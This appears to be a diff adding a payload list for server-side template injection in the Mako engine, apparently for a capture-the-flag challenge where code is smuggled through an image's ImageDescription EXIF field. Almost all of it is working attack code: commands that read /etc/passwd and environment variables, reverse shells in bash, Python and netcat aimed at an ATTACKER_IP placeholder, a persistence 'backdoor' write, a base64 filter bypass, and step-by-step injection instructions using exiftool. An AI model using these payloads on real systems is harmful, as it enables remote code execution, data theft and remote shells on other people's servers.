@@ -1,0 +1,92 @@
+# SSTI Payloads for Mako Template Engine
+# These payloads work with the ImageDescription EXIF field vulnerability
+
+## Basic Command Execution
+${__import__("os").popen("whoami").read()}
+${__import__("os").popen("id").read()}
+${__import__("os").popen("pwd").read()}
+${__import__("os").popen("ls -la").read()}
+${__import__("os").popen("uname -a").read()}
+
+## File System Operations
+${__import__("os").popen("cat /etc/passwd").read()}
+${__import__("os").popen("cat /etc/hosts").read()}
+${__import__("os").popen("find / -name '*.txt' 2>/dev/null").read()}
+${__import__("os").popen("ls -la /home").read()}
+${__import__("os").popen("ls -la /var/www").read()}
+
+## Flag Reading (CTF Context)
+${__import__("os").popen("cat /home/www/flag.txt").read()}
+${__import__("os").popen("find / -name '*flag*' 2>/dev/null").read()}
+${__import__("os").popen("grep -r 'BCTF{' / 2>/dev/null").read()}
+
+## Network Information
+${__import__("os").popen("ifconfig").read()}
+${__import__("os").popen("netstat -an").read()}
+${__import__("os").popen("ps aux").read()}
+
+## Reverse Shell Payloads
+# Bash reverse shell
+${__import__("subprocess").run(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"], capture_output=False)}
+
+# Python reverse shell
+${__import__("subprocess").run(["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"], capture_output=False)}
+
+# Netcat reverse shell
+${__import__("subprocess").run(["nc", "-e", "/bin/sh", "ATTACKER_IP", "PORT"], capture_output=False)}
+
+## Alternative Execution Methods
+# Using subprocess.call
+${__import__("subprocess").call(["whoami"], shell=True)}
+
+# Using os.system
+${__import__("os").system("whoami")}
+
+## Environment Variables
+${__import__("os").environ}
+${__import__("os").environ.get('PATH')}
+${__import__("os").environ.get('USER')}
+
+## Python Code Execution
+# Execute arbitrary Python code
+${exec("import os; print(os.getcwd())")}
+${eval("__import__('os').getcwd()")}
+
+## File Writing (for persistence)
+${open('/tmp/test.txt', 'w').write('SSTI Test')}
+${__import__("os").popen("echo 'backdoor' > /tmp/backdoor.txt").read()}
+
+## Advanced Payloads
+# Multi-command execution
+${__import__("os").popen("whoami && id && pwd").read()}
+
+# Base64 encoded commands (to bypass filters)
+${__import__("os").popen("echo 'd2hvYW1p' | base64 -d | bash").read()}
+
+## Error-based Information Disclosure
+${1/0}  # Causes division by zero error
+${undefined_variable}  # Causes NameError
+
+## Template Context Exploration
+${dir()}  # List available variables
+${globals()}  # Access global namespace
+${locals()}  # Access local namespace
+
+## Usage Instructions:
+# 1. Replace ATTACKER_IP with your IP address (e.g., 127.0.0.1)
+# 2. Replace PORT with your listener port (e.g., 4444)
+# 3. Inject payload into ImageDescription EXIF field
+# 4. Upload the malicious image to the vulnerable application
+
+## Example with exiftool:
+# exiftool -ImageDescription='${__import__("os").popen("whoami").read()}' image.jpg
+
+## Example with Python PIL (manual EXIF injection):
+# See the deleted exploit scripts for implementation details
+
+## Notes:
+# - All payloads use Mako template syntax ${...}
+# - The vulnerability exists in the ImageDescription EXIF field processing
+# - Server executes these as Python code within the Mako template context
+# - Always test in a controlled environment
+# - Some payloads may require specific system tools (nc, bash, etc.)
